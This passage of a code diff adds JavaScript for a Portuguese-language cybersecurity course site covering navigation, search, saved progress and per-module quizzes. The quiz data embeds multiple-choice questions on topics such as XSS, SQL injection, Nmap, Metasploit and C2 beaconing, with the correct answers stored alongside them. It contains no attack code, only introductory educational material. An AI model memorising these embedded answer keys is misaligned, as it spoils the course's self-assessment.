+      });
+    } else if (href.startsWith('http://') || href.startsWith('https://')) {
+      link.setAttribute('target', '_blank');
+      link.setAttribute('rel', 'noopener noreferrer');
+    }
+  });
+});
+
+// ============================================
+// ACTIVE SIDEBAR LINK ON SCROLL
+// ============================================
+const sections = document.querySelectorAll('.section');
+const navLinks = document.querySelectorAll('.sidebar-nav a, .nav-links a');
+
+window.addEventListener('scroll', () => {
+  let current = '';
+  sections.forEach(section => {
+    const sectionTop = section.offsetTop;
+    if (scrollY >= sectionTop - 100) {
+      current = section.getAttribute('id');
+    }
+  });
+
+  navLinks.forEach(link => {
+    link.classList.remove('active');
+    if (link.getAttribute('href') === '#' + current) {
+      link.classList.add('active');
+    }
+  });
+
+  // Back to top visibility
+  if (scrollY > 600) {
+    backToTop.classList.add('visible');
+  } else {
+    backToTop.classList.remove('visible');
+  }
+});
+
+// ============================================
+// BACK TO TOP
+// ============================================
+const backToTop = document.getElementById('backToTop');
+backToTop.addEventListener('click', () => {
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+});
+
+// ============================================
+// MOBILE MENU (HAMBURGER)
+// ============================================
+const menuToggle = document.getElementById('menuToggle');
+const sidebar = document.getElementById('sidebar');
+const sidebarOverlay = document.getElementById('sidebarOverlay');
+
+function openSidebar() {
+  sidebar.classList.add('open');
+  sidebarOverlay.classList.add('open');
+  menuToggle.setAttribute('aria-expanded', 'true');
+}
+function closeSidebar() {
+  sidebar.classList.remove('open');
+  sidebarOverlay.classList.remove('open');
+  menuToggle.setAttribute('aria-expanded', 'false');
+}
+menuToggle.addEventListener('click', () => {
+  if (sidebar.classList.contains('open')) closeSidebar();
+  else openSidebar();
+});
+sidebarOverlay.addEventListener('click', closeSidebar);
+
+// ============================================
+// COPIAR CÓDIGO
+// ============================================
+document.querySelectorAll('pre').forEach(function(pre) {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.textContent = 'Copiar';
+  btn.setAttribute('aria-label', 'Copiar código');
+  btn.addEventListener('click', function() {
+    const code = pre.querySelector('code');
+    const text = code ? code.innerText : pre.innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      btn.textContent = 'Copiado!';
+      btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'Copiar'; btn.classList.remove('copied'); }, 1800);
+    }).catch(() => {
+      btn.textContent = 'Erro';
+      setTimeout(() => { btn.textContent = 'Copiar'; }, 1800);
+    });
+  });
+  pre.appendChild(btn);
+});
+
+// ============================================
+// PERSISTENCIA (localStorage)
+// ============================================
+const STORAGE_KEY_PROGRESS = 'doomProtocol.progressoModulos.v1';
+const STORAGE_KEY_QUIZ = 'doomProtocol.quizAnswers.v1';
+let storageDisponivel = true;
+
+function testarStorage() {
+  try {
+    const testKey = '__doom_test__';
+    localStorage.setItem(testKey, '1');
+    localStorage.removeItem(testKey);
+    return true;
+  } catch (e) {
+    return false;
+  }
+}
+storageDisponivel = testarStorage();
+
+function salvarProgresso() {
+  if (!storageDisponivel) return;
+  try {
+    localStorage.setItem(STORAGE_KEY_PROGRESS, JSON.stringify(progressoModulos));
+    localStorage.setItem(STORAGE_KEY_QUIZ, JSON.stringify(quizAnswers));
+    mostrarIndicadorSalvo();
+  } catch (e) {
+    storageDisponivel = false;
+  }
+}
+
+function carregarProgressoSalvo() {
+  if (!storageDisponivel) return { progresso: {}, quiz: {} };
+  try {
+    const progresso = JSON.parse(localStorage.getItem(STORAGE_KEY_PROGRESS) || '{}');
+    const quiz = JSON.parse(localStorage.getItem(STORAGE_KEY_QUIZ) || '{}');
+    return { progresso, quiz };
+  } catch (e) {
+    return { progresso: {}, quiz: {} };
+  }
+}
+
+let saveIndicatorTimeout = null;
+function mostrarIndicadorSalvo() {
+  const el = document.getElementById('saveIndicator');
+  if (!el) return;
+  el.classList.add('shown');
+  clearTimeout(saveIndicatorTimeout);
+  saveIndicatorTimeout = setTimeout(() => el.classList.remove('shown'), 2000);
+}
+
+// ============================================
+// TRACKER DE PROGRESSO (persistido em localStorage)
+// ============================================
+const TOTAL_MODULOS = 17;
+const progressoModulos = {};
+
+function pad(n) { return String(n).padStart(2, '0'); }
+
+function atualizarProgressoGeral() {
+  const concluidos = Object.values(progressoModulos).filter(Boolean).length;
+  const pct = Math.round((concluidos / TOTAL_MODULOS) * 100);
+  document.getElementById('overallProgressFill').style.width = pct + '%';
+  document.getElementById('overallProgressText').textContent = `${concluidos}/${TOTAL_MODULOS}`;
+  atualizarNivelDeAcesso(concluidos / TOTAL_MODULOS);
+}
+
+const RANKS = [
+  { min: 0,    label: 'RECRUTA' },
+  { min: 0.26, label: 'OPERADOR' },
+  { min: 0.51, label: 'AGENTE ELITE' },
+  { min: 0.76, label: 'COMANDANTE' },
+  { min: 1,    label: 'MESTRE DO PROTOCOLO' }
+];
+
+let currentRankLabel = null;
+
+function atualizarNivelDeAcesso(fracao, forcarSemAnimacao) {
+  let rank = RANKS[0];
+  RANKS.forEach(r => { if (fracao >= r.min) rank = r; });
+
+  const rankEl = document.getElementById('clearanceRank');
+  const statusBadge = document.querySelector('.status-badge');
+  const mudou = rank.label !== currentRankLabel;
+
+  currentRankLabel = rank.label;
+  if (rankEl) rankEl.textContent = rank.label;
+  if (statusBadge) {
+    statusBadge.textContent = '● NÍVEL: ' + rank.label;
+    if (mudou && !forcarSemAnimacao) {
+      statusBadge.classList.remove('rank-updated');
+      void statusBadge.offsetWidth;
+      statusBadge.classList.add('rank-updated');
+    }
+  }
+  if (mudou && !forcarSemAnimacao && fracao >= 1) {
+    showCelebration();
+  }
+}
+
+function showCelebration() {
+  const banner = document.getElementById('celebrationBanner');
+  if (!banner) return;
+  banner.classList.add('shown');
+  setTimeout(() => banner.classList.remove('shown'), 9000);
+}
+
+document.getElementById('celebrationClose')?.addEventListener('click', () => {
+  document.getElementById('celebrationBanner').classList.remove('shown');
+});
+
+function setModuloConcluido(mod, concluido, semSalvar) {
+  progressoModulos[mod] = concluido;
+
+  // Checkbox da sidebar
+  const check = document.querySelector(`.mod-check[data-mod="${mod}"]`);
+  if (check) {
+    check.classList.toggle('done', concluido);
+    check.textContent = concluido ? '✓' : '';
+    check.setAttribute('aria-checked', concluido ? 'true' : 'false');
+  }
+
+  // Botão da seção
+  const btn = document.querySelector(`.mark-complete-btn[data-mod="${mod}"]`);
+  if (btn) {
+    btn.classList.toggle('done', concluido);
+    btn.textContent = concluido ? 'Concluído ✓' : 'Marcar concluído';
+  }
+
+  // Selo no card do grid interativo
+  const cardCheck = document.querySelector(`.module-card-check[data-mod="${mod}"]`);
+  if (cardCheck) {
+    cardCheck.classList.toggle('done', concluido);
+    cardCheck.textContent = concluido ? '✓' : '';
+  }
+
+  atualizarProgressoGeral();
+  if (!semSalvar) salvarProgresso();
+}
+
+document.querySelectorAll('.mark-complete-btn').forEach(function(btn) {
+  btn.addEventListener('click', function() {
+    const mod = btn.getAttribute('data-mod');
+    setModuloConcluido(mod, !progressoModulos[mod]);
+  });
+});
+
+function toggleModCheck(check) {
+  const mod = check.getAttribute('data-mod');
+  setModuloConcluido(mod, !progressoModulos[mod]);
+}
+
+document.querySelectorAll('.mod-check').forEach(function(check) {
+  check.addEventListener('click', function(e) {
+    e.preventDefault();
+    e.stopPropagation();
+    toggleModCheck(check);
+  });
+  check.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter' || e.key === ' ') {
+      e.preventDefault();
+      e.stopPropagation();
+      toggleModCheck(check);
+    }
+  });
+});
+
+// Selo de progresso dentro do card do grid tambem alterna o status ao ser clicado
+document.querySelectorAll('.module-card-check').forEach(function(check) {
+  check.addEventListener('click', function(e) {
+    e.preventDefault();
+    e.stopPropagation();
+    const mod = check.getAttribute('data-mod');
+    setModuloConcluido(mod, !progressoModulos[mod]);
+  });
+});
+
+// Botao de resetar progresso
+document.getElementById('resetProgressBtn')?.addEventListener('click', function() {
+  const confirmado = window.confirm('Isso vai apagar seu progresso e respostas de quiz salvos neste navegador. Deseja continuar?');
+  if (!confirmado) return;
+
+  Object.keys(progressoModulos).forEach(mod => setModuloConcluido(mod, false, true));
+  Object.keys(quizAnswers).forEach(mod => delete quizAnswers[mod]);
+  document.querySelectorAll('.quiz-container').forEach(container => {
+    const mod = container.getAttribute('data-quiz-mod');
+    renderQuiz(mod);
+  });
+
+  if (storageDisponivel) {
+    try {
+      localStorage.removeItem(STORAGE_KEY_PROGRESS);
+      localStorage.removeItem(STORAGE_KEY_QUIZ);
+    } catch (e) { /* ignora */ }
+  }
+  mostrarIndicadorSalvo();
+});
+
+// ============================================
+// SEQUENCIA DE BOOT ANIMADA NO HERO
+// ============================================
+const bootLines = [
+  'Inicializando DOOM_PROTOCOL v1.0 ...',
+  'Verificando credenciais de operador ... <span class="ok">OK</span>',
+  'Carregando 17 modulos de treinamento ... <span class="ok">OK</span>',
+  'Sistema pronto. Acesso concedido.'
+];
+
+function runBootSequence() {
+  const container = document.getElementById('bootSequence');
+  if (!container || window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+    if (container) {
+      container.innerHTML = bootLines.map(l => `<div class="boot-line shown">${l}</div>`).join('');
+    }
+    return;
+  }
+
+  let i = 0;
+  function nextLine() {
+    if (i >= bootLines.length) {
+      const cursor = document.createElement('span');
+      cursor.className = 'boot-cursor';
+      container.appendChild(cursor);
+      return;
+    }
+    const line = document.createElement('div');
+    line.className = 'boot-line';
+    line.innerHTML = bootLines[i];
+    container.appendChild(line);
+    requestAnimationFrame(() => requestAnimationFrame(() => line.classList.add('shown')));
+    i++;
+    setTimeout(nextLine, 480);
+  }
+  nextLine();
+}
+runBootSequence();
+
+// ============================================
+// SCROLL REVEAL (fade/slide ao entrar na tela)
+// ============================================
+document.querySelectorAll('.card, .table-wrap').forEach(el => el.classList.add('reveal'));
+
+const revealObserver = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('in-view');
+      revealObserver.unobserve(entry.target);
+    }
+  });
+}, { threshold: 0.08, rootMargin: '0px 0px -40px 0px' });
+
+document.querySelectorAll('.reveal').forEach(el => revealObserver.observe(el));
+
+// ============================================
+// TILT 3D SUAVE NOS CARDS (com throttle via requestAnimationFrame)
+// ============================================
+function attachTilt(el) {
+  let pendingEvent = null;
+  let ticking = false;
+
+  function applyTilt() {
+    const e = pendingEvent;
+    ticking = false;
+    if (!e) return;
+    const rect = el.getBoundingClientRect();
+    const x = e.clientX - rect.left;
+    const y = e.clientY - rect.top;
+    const px = (x / rect.width) * 100;
+    const py = (y / rect.height) * 100;
+    const rx = ((y / rect.height) - 0.5) * -6;
+    const ry = ((x / rect.width) - 0.5) * 6;
+    el.style.setProperty('--mx', px + '%');
+    el.style.setProperty('--my', py + '%');
+    el.style.transform = `perspective(600px) rotateX(${rx}deg) rotateY(${ry}deg) translateY(-3px)`;
+  }
+
+  el.addEventListener('mousemove', (e) => {
+    pendingEvent = e;
+    if (!ticking) {
+      ticking = true;
+      requestAnimationFrame(applyTilt);
+    }
+  });
+  el.addEventListener('mouseleave', () => {
+    pendingEvent = null;
+    el.style.transform = '';
+  });
+}
+
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches && window.matchMedia('(hover: hover)').matches) {
+  document.querySelectorAll('.module-card').forEach(attachTilt);
+}
+
+// ============================================
+// BUSCADOR GLOBAL
+// ============================================
+function normalizar(str) {
+  return str.normalize('NFD').replace(/[\u0300-\u036f]/g, '').toLowerCase();
+}
+
+// Monta o indice de busca a partir de cada card de conteudo da pagina
+const searchIndex = [];
+document.querySelectorAll('main .section').forEach(section => {
+  const moduleTitleEl = section.querySelector('.section-header h2');
+  const moduleTitle = moduleTitleEl ? moduleTitleEl.textContent.trim() : '';
+
+  section.querySelectorAll('.card').forEach(card => {
+    const titleEl = card.querySelector('h3');
+    const title = titleEl ? titleEl.textContent.trim() : moduleTitle;
+    // Remove o texto do titulo do corpo para nao duplicar no snippet
+    const fullText = card.textContent.replace(title, '').replace(/\s+/g, ' ').trim();
+
+    searchIndex.push({
+      element: card,
+      title: title,
+      moduleTitle: moduleTitle,
+      text: fullText,
+      normTitle: normalizar(title),
+      normModule: normalizar(moduleTitle),
+      normText: normalizar(fullText)
+    });
+  });
+});
+
+function highlightMatch(text, query) {
+  if (!query) return text;
+  const normText = normalizar(text);
+  const idx = normText.indexOf(query);
+  if (idx === -1) return text;
+  return text.slice(0, idx) + '<mark>' + text.slice(idx, idx + query.length) + '</mark>' + text.slice(idx + query.length);
+}
+
+function snippetAround(text, query, radius) {
+  const normText = normalizar(text);
+  const idx = normText.indexOf(query);
+  if (idx === -1) return text.slice(0, radius * 2);
+  const start = Math.max(0, idx - radius);
+  const end = Math.min(text.length, idx + query.length + radius);
+  let snippet = text.slice(start, end);
+  if (start > 0) snippet = '...' + snippet;
+  if (end < text.length) snippet = snippet + '...';
+  return highlightMatch(snippet, query);
+}
+
+const searchOverlay = document.getElementById('searchOverlay');
+const searchInput = document.getElementById('searchInput');
+const searchResultsEl = document.getElementById('searchResults');
+const searchTrigger = document.getElementById('searchTrigger');
+let selectedResultIndex = -1;
+let elementoFocadoAntesDoModal = null;
+
+function getFocusableInModal() {
+  return Array.from(document.querySelectorAll('.search-modal button, .search-modal input, .search-modal [tabindex]'))
+    .filter(el => el.offsetParent !== null);
+}
+
+function openSearch() {
+  elementoFocadoAntesDoModal = document.activeElement;
+  searchOverlay.classList.add('open');
+  searchInput.value = '';
+  searchInput.focus();
+  renderSearchResults('');
+}
+
+function closeSearch() {
+  searchOverlay.classList.remove('open');
+  if (elementoFocadoAntesDoModal && typeof elementoFocadoAntesDoModal.focus === 'function') {
+    elementoFocadoAntesDoModal.focus();
+  }
+}
+
+// Focus trap: mantem o foco dentro do modal enquanto ele estiver aberto
+searchOverlay.addEventListener('keydown', (e) => {
+  if (e.key !== 'Tab' || !searchOverlay.classList.contains('open')) return;
+  const focusable = getFocusableInModal();
+  if (focusable.length === 0) return;
+  const first = focusable[0];
+  const last = focusable[focusable.length - 1];
+
+  if (e.shiftKey && document.activeElement === first) {
+    e.preventDefault();
+    last.focus();
+  } else if (!e.shiftKey && document.activeElement === last) {
+    e.preventDefault();
+    first.focus();
+  }
+});
+
+function renderSearchResults(rawQuery) {
+  const query = normalizar(rawQuery.trim());
+  selectedResultIndex = -1;
+
+  if (!query) {
+    searchResultsEl.innerHTML = '<div class="search-empty">Digite para buscar em todos os 17 módulos — títulos, comandos e conceitos.</div>';
+    return;
+  }
+
+  const matches = searchIndex
+    .map(item => {
+      let score = 0;
+      if (item.normTitle.includes(query)) score += 3;
+      if (item.normModule.includes(query)) score += 2;
+      if (item.normText.includes(query)) score += 1;
+      return { item, score };
+    })
+    .filter(m => m.score > 0)
+    .sort((a, b) => b.score - a.score)
+    .slice(0, 10);
+
+  if (matches.length === 0) {
+    searchResultsEl.innerHTML = '<div class="search-empty">Nenhum resultado para "' + rawQuery.replace(/</g, '&lt;') + '".</div>';
+    return;
+  }
+
+  searchResultsEl.innerHTML = matches.map((m, i) => {
+    const item = m.item;
+    const titleHtml = highlightMatch(item.title, query);
+    const snippetHtml = snippetAround(item.text, query, 60);
+    return `<button type="button" class="search-result" data-index="${i}">
+      <div class="search-result-meta">${item.moduleTitle}</div>
+      <div class="search-result-title">${titleHtml}</div>
+      <div class="search-result-snippet">${snippetHtml}</div>
+    </button>`;
+  }).join('');
+
+  window.__currentSearchMatches = matches;
+
+  searchResultsEl.querySelectorAll('.search-result').forEach(el => {
+    el.addEventListener('click', () => {
+      const idx = parseInt(el.getAttribute('data-index'), 10);
+      jumpToResult(idx);
+    });
+  });
+}
+
+function jumpToResult(idx) {
+  const matches = window.__currentSearchMatches;
+  if (!matches || !matches[idx]) return;
+  const target = matches[idx].item.element;
+  closeSearch();
+  setTimeout(() => {
+    target.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    target.classList.add('jump-flash');
+    setTimeout(() => target.classList.remove('jump-flash'), 1500);
+  }, 100);
+}
+
+function updateSelectedResult() {
+  const items = searchResultsEl.querySelectorAll('.search-result');
+  items.forEach((el, i) => el.classList.toggle('selected', i === selectedResultIndex));
+  if (items[selectedResultIndex]) {
+    items[selectedResultIndex].scrollIntoView({ block: 'nearest' });
+  }
+}
+
+searchTrigger.addEventListener('click', openSearch);
+searchOverlay.addEventListener('click', (e) => {
+  if (e.target === searchOverlay) closeSearch();
+});
+
+searchInput.addEventListener('input', (e) => renderSearchResults(e.target.value));
+
+searchInput.addEventListener('keydown', (e) => {
+  const items = searchResultsEl.querySelectorAll('.search-result');
+  if (e.key === 'ArrowDown') {
+    e.preventDefault();
+    selectedResultIndex = Math.min(selectedResultIndex + 1, items.length - 1);
+    updateSelectedResult();
+  } else if (e.key === 'ArrowUp') {
+    e.preventDefault();
+    selectedResultIndex = Math.max(selectedResultIndex - 1, 0);
+    updateSelectedResult();
+  } else if (e.key === 'Enter') {
+    e.preventDefault();
+    const idx = selectedResultIndex >= 0 ? selectedResultIndex : 0;
+    jumpToResult(idx);
+  } else if (e.key === 'Escape') {
+    closeSearch();
+  }
+});
+
+document.addEventListener('keydown', (e) => {
+  const isTypingField = ['INPUT', 'TEXTAREA'].includes(document.activeElement.tagName);
+  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') {
+    e.preventDefault();
+    openSearch();
+  } else if (e.key === '/' && !isTypingField) {
+    e.preventDefault();
+    openSearch();
+  } else if (e.key === 'Escape' && searchOverlay.classList.contains('open')) {
+    closeSearch();
+  }
+});
+
+// ============================================
+// SISTEMA DE QUIZ POR MODULO
+// ============================================
+const QUIZ_APROVACAO_MINIMA = 0.7; // 70% de acertos para aprovar o checkpoint
+
+const quizData = {
+  "01": [
+    { q: "Quais são os 3 pilares da tríade CIA?", options: ["Confidencialidade, Integridade e Disponibilidade", "Confidencialidade, Identidade e Disponibilidade", "Criptografia, Integridade e Auditoria", "Confiança, Integridade e Disponibilidade"], correct: 0, explain: "CIA = Confidencialidade, Integridade e Disponibilidade — os três pilares da segurança da informação." },
+    { q: "Qual tipo de hacker atua sem autorização, mas reporta as falhas encontradas depois?", options: ["White Hat", "Black Hat", "Grey Hat", "Script Kiddie"], correct: 2, explain: "Grey Hat age numa zona cinzenta: sem autorização formal, mas com intenção de reportar, não explorar maliciosamente." }
+  ],
+  "02": [
+    { q: "Qual componente armazena dados apenas temporariamente, perdendo tudo ao desligar?", options: ["SSD", "RAM", "HD", "BIOS"], correct: 1, explain: "RAM é memória volátil — perde os dados assim que a energia é cortada." },
+    { q: "Qual firmware moderno substitui a BIOS tradicional e oferece Secure Boot?", options: ["UEFI", "POST", "NIC", "PCIe"], correct: 0, explain: "UEFI é a evolução da BIOS, com suporte a discos maiores e Secure Boot." }
+  ],
+  "03": [
+    { q: "No Linux, qual comando lista arquivos incluindo os ocultos?", options: ["dir", "ls -la", "cat", "pwd"], correct: 1, explain: "A flag -a do ls mostra também arquivos ocultos (que começam com ponto)." },
+    { q: "O valor de permissão 755 em chmod significa:", options: ["rwxr-xr-x", "rwxrwxrwx", "rw-r--r--", "rwx------"], correct: 0, explain: "7=rwx (dono), 5=r-x (grupo), 5=r-x (outros) → rwxr-xr-x." }
+  ],
+  "04": [
+    { q: "Qual protocolo de transporte garante entrega confiável com handshake de 3 vias?", options: ["UDP", "ICMP", "TCP", "ARP"], correct: 2, explain: "TCP usa o 3-way handshake (SYN, SYN-ACK, ACK) para garantir entrega confiável." },
+    { q: "Qual porta padrão é usada pelo HTTPS?", options: ["80", "443", "21", "22"], correct: 1, explain: "HTTPS usa a porta 443 por padrão; a 80 é do HTTP sem criptografia." }
+  ],
+  "05": [
+    { q: "Qual linguagem é mais associada a desenvolvimento de exploits e engenharia reversa de baixo nível?", options: ["Python", "SQL", "C/C++", "HTML"], correct: 2, explain: "C/C++ trabalha próximo do hardware e memória, essencial para exploits e engenharia reversa." },
+    { q: "Qual linguagem é citada como usada em Red Team e post-exploitation no Windows?", options: ["Python", "PowerShell", "SQL", "Go"], correct: 1, explain: "PowerShell é nativo do Windows e amplamente usado em operações de Red Team na plataforma." }
+  ],
+  "06": [
+    { q: "Qual módulo Python foi usado no curso para criptografia simétrica (AES) via Fernet?", options: ["hashlib", "cryptography", "secrets", "socket"], correct: 1, explain: "A classe Fernet, usada para AES simétrico, vem do pacote 'cryptography'." },
+    { q: "Em Python, o que significa `s.connect_ex((ip, porta))` retornar 0?", options: ["Que a porta está fechada", "Que houve erro de DNS", "Que a conexão foi bem-sucedida (porta aberta)", "Que o host está offline"], correct: 2, explain: "connect_ex retorna 0 quando a conexão é estabelecida com sucesso — ou seja, a porta está aberta." }
+  ],
+  "07": [
+    { q: "Qual vulnerabilidade permite injetar scripts maliciosos que rodam no navegador da vítima?", options: ["SQL Injection", "XSS", "CSRF", "SSRF"], correct: 1, explain: "XSS (Cross-Site Scripting) injeta e executa script no contexto do navegador da vítima." },
+    { q: "Qual é a defesa primária contra SQL Injection?", options: ["Escapar HTML", "Prepared Statements", "Usar cookies HttpOnly", "Aumentar o timeout"], correct: 1, explain: "Prepared Statements separam código SQL de dados, prevenindo a injeção na origem." }
+  ],
+  "08": [
+    { q: "Qual flag do Nmap faz um scan silencioso baseado só no primeiro pacote do handshake?", options: ["-sU", "-A", "-sS", "-F"], correct: 2, explain: "-sS é o SYN stealth scan: nunca completa o handshake TCP." },
+    { q: "No Metasploit, qual comando define o alvo remoto do exploit?", options: ["set LHOST", "set RHOSTS", "use exploit", "show payloads"], correct: 1, explain: "RHOSTS define o(s) Remote Host(s), ou seja, o alvo do ataque." }
+  ],
+  "09": [
+    { q: "O que o bit SUID permite quando aplicado a um binário?", options: ["Executar como o dono do arquivo", "Apenas leitura para todos", "Bloquear a exclusão do arquivo", "Executar sempre como root"], correct: 0, explain: "SUID faz o binário rodar com as permissões do seu dono, não de quem o executa." },
+    { q: "Qual comando mostra pacotes de rede sendo capturados em tempo real?", options: ["top", "tcpdump", "df -h", "crontab -e"], correct: 1, explain: "tcpdump captura e exibe o tráfego de rede em tempo real diretamente no terminal." }
+  ],
+  "10": [
+    { q: "No Password Manager do curso, qual técnica derivou a chave a partir da senha mestre?", options: ["MD5 simples", "PBKDF2", "Base64", "ROT13"], correct: 1, explain: "PBKDF2HMAC deriva uma chave criptográfica forte a partir da senha mestre e de um salt." },
+    { q: "No Scanner de Portas com threads, o que evita condição de corrida na lista de resultados?", options: ["Um dicionário comum", "threading.Lock", "Uma fila FIFO manual", "Nada, threads não competem"], correct: 1, explain: "O threading.Lock garante que apenas uma thread por vez escreva na lista compartilhada." }
+  ],
+  "11": [
+    { q: "Qual comando SQL remove permissões antes concedidas a um usuário?", options: ["GRANT", "REVOKE", "DROP", "DELETE"], correct: 1, explain: "REVOKE retira permissões previamente concedidas com GRANT." },
+    { q: "Qual técnica de SQL Injection usa atrasos (ex: SLEEP) para confirmar a falha sem retorno visível?", options: ["Union-based", "Error-based", "Time-based", "Blind Boolean"], correct: 2, explain: "Time-based injection mede o atraso de resposta para inferir se a injeção funcionou." }
+  ],
+  "12": [
+    { q: "Qual algoritmo de hash é considerado quebrado e não deve mais ser usado para segurança?", options: ["SHA-256", "SHA-3", "MD5", "bcrypt"], correct: 2, explain: "MD5 tem colisões conhecidas e é considerado inseguro para fins criptográficos." },
+    { q: "Criptografia assimétrica se caracteriza por usar:", options: ["A mesma chave para cifrar e decifrar", "Duas chaves — pública e privada", "Apenas hashes irreversíveis", "Nenhuma chave"], correct: 1, explain: "Assimétrica usa um par de chaves matematicamente relacionadas: uma pública, uma privada." }
+  ],
+  "13": [
+    { q: "No modelo de Responsabilidade Compartilhada, quem protege os dados e configurações do cliente?", options: ["Somente o provedor cloud", "Somente o governo", "O próprio cliente", "Ninguém, é automático"], correct: 2, explain: "A cloud protege a infraestrutura; o cliente é responsável por seus próprios dados e configurações." },
+    { q: "Em um Dockerfile seguro, por que criar um usuário não-root com useradd?", options: ["Para economizar espaço em disco", "Para evitar que o container rode com privilégios administrativos", "Para acelerar o build", "É apenas estética"], correct: 1, explain: "Rodar como usuário não-root reduz o impacto caso o container seja comprometido." }
+  ],
+  "14": [
+    { q: "O que significa SIEM?", options: ["Security Incident Exploit Management", "Security Information and Event Management", "System Integrity and Event Monitoring", "Secure Internet Endpoint Manager"], correct: 1, explain: "SIEM = Security Information and Event Management, a plataforma central de correlação de logs de um SOC." },
+    { q: "O framework MITRE ATT&CK é usado principalmente para:", options: ["Gerar senhas fortes", "Mapear táticas e técnicas de adversários", "Substituir o firewall", "Criptografar backups"], correct: 1, explain: "MITRE ATT&CK cataloga táticas e técnicas reais de adversários, usado para mapear detecções." }
+  ],
+  "15": [
+    { q: "O que é 'beaconing' em um C2 (Command and Control)?", options: ["Um tipo de firewall", "Comunicação periódica da vítima com o servidor do atacante", "Um protocolo de e-mail", "Um antivírus"], correct: 1, explain: "Beaconing é o check-in periódico que a máquina comprometida faz com o servidor de C2." },
+    { q: "Qual a principal diferença entre Red Team e Pentest tradicional?", options: ["Red Team é sempre mais rápido", "Red Team testa a detecção e resposta da organização inteira", "Pentest não usa ferramentas", "Não há diferença"], correct: 1, explain: "Red Team simula um adversário real testando pessoas, processos e tecnologia — não só falhas técnicas." }
+  ],
+  "16": [
+    { q: "Qual dupla de tecnologias foi usada no projeto 'Chat Criptografado' da lista de 15 projetos?", options: ["Python + AES", "PHP + MySQL", "HTML + CSS", "Go + Docker"], correct: 0, explain: "O Chat Criptografado combina sockets em Python com criptografia AES em trânsito." },
+    { q: "O projeto 'Sistema SQL com Defesa' tem como foco principal:", options: ["Design de interface", "SQL Injection e defesa em camadas", "Redes sociais", "Machine Learning"], correct: 1, explain: "Esse projeto consolida prepared statements, ORM e princípio do menor privilégio contra SQL Injection." }
+  ],
+  "17": [
+    { q: "Qual certificação é apontada como fundamentos amplos para iniciantes?", options: ["OSCP", "CISSP", "CompTIA Security+", "CEH"], correct: 2, explain: "CompTIA Security+ é a certificação de entrada com fundamentos amplos de segurança." },
+    { q: "No roadmap do curso, a OSCP é classificada como:", options: ["Iniciante", "Intermediária", "Avançada (pentest técnico hands-on)", "Não é mencionada"], correct: 2, explain: "OSCP exige exploração prática hands-on e é classificada como certificação avançada no roadmap." }
+  ]
+};
+
+const quizAnswers = {};
+
+function renderQuiz(mod) {
+  const container = document.querySelector(`.quiz-container[data-quiz-mod="${mod}"]`);
+  if (!container || !quizData[mod]) return;
+
+  const questions = quizData[mod];
+  quizAnswers[mod] = quizAnswers[mod] || new Array(questions.length).fill(null);
+
+  container.innerHTML = questions.map((item, qi) => `
+    <div class="quiz-question" data-qi="${qi}" role="radiogroup" aria-label="${(qi + 1) + '. ' + item.q}">
+      <div class="quiz-question-text">${qi + 1}. ${item.q}</div>
+      <div class="quiz-options">
+        ${item.options.map((opt, oi) => `
+          <button type="button" class="quiz-option" data-oi="${oi}" role="radio" aria-checked="false">
+            <span class="quiz-option-marker"></span>
+            <span>${opt}</span>
+          </button>
+        `).join('')}
+      </div>
+      <div class="quiz-explain" aria-live="polite"></div>
+    </div>
+  `).join('') + `
+    <button type="button" class="quiz-submit-btn" data-mod="${mod}">Verificar respostas</button>
+    <div class="quiz-result" aria-live="polite"></div>
+  `;
+
+  container.querySelectorAll('.quiz-question').forEach(qEl => {
+    const qi = parseInt(qEl.getAttribute('data-qi'), 10);
+    const respostaSalva = quizAnswers[mod][qi];
+    qEl.querySelectorAll('.quiz-option').forEach(optEl => {
+      const oi = parseInt(optEl.getAttribute('data-oi'), 10);
+      if (respostaSalva === oi) {
+        optEl.classList.add('selected');
+        optEl.setAttribute('aria-checked', 'true');
+      }
+      optEl.addEventListener('click', () => {
+        if (optEl.classList.contains('disabled')) return;
+        qEl.querySelectorAll('.quiz-option').forEach(o => { o.classList.remove('selected'); o.setAttribute('aria-checked', 'false'); });
+        optEl.classList.add('selected');
+        optEl.setAttribute('aria-checked', 'true');
+        quizAnswers[mod][qi] = parseInt(optEl.getAttribute('data-oi'), 10);
+        salvarProgresso();
+      });
+    });
+  });
+
+  container.querySelector('.quiz-submit-btn').addEventListener('click', () => corrigirQuiz(mod));
+}
+
+function corrigirQuiz(mod) {
+  const container = document.querySelector(`.quiz-container[data-quiz-mod="${mod}"]`);
+  const questions = quizData[mod];
+  const respostas = quizAnswers[mod];
+  let acertos = 0;
+
+  container.querySelectorAll('.quiz-question').forEach(qEl => {
+    const qi = parseInt(qEl.getAttribute('data-qi'), 10);
+    const item = questions[qi];
+    const resposta = respostas[qi];
+    if (resposta === item.correct) acertos++;
+
+    qEl.querySelectorAll('.quiz-option').forEach(optEl => {
+      const oi = parseInt(optEl.getAttribute('data-oi'), 10);
+      optEl.classList.add('disabled');
+      if (oi === item.correct) optEl.classList.add('correct');
+      else if (oi === resposta) optEl.classList.add('wrong');
+    });
+
+    const explainEl = qEl.querySelector('.quiz-explain');
+    explainEl.textContent = item.explain;
+    explainEl.classList.add('shown');
+  });
+
+  const total = questions.length;
+  const passou = acertos / total >= QUIZ_APROVACAO_MINIMA;
+  const resultEl = container.querySelector('.quiz-result');
+  resultEl.classList.add('shown', passou ? 'pass' : 'fail');
+  resultEl.innerHTML = `<span>${acertos}/${total} respostas corretas — ${passou ? 'Acesso liberado ✓' : 'Tente novamente (mínimo ' + Math.round(QUIZ_APROVACAO_MINIMA * 100) + '%)'}</span>` +
+    (!passou ? '<button type="button" class="quiz-retry-btn">Refazer quiz</button>' : '');
+
+  container.querySelector('.quiz-submit-btn').disabled = true;
+
+  const retryBtn = resultEl.querySelector('.quiz-retry-btn');
+  if (retryBtn) {
+    retryBtn.addEventListener('click', () => {
+      quizAnswers[mod] = new Array(total).fill(null);
+      renderQuiz(mod);
+      salvarProgresso();
+    });
+  }
+
+  if (passou) {
+    setModuloConcluido(mod, true);
+  } else {
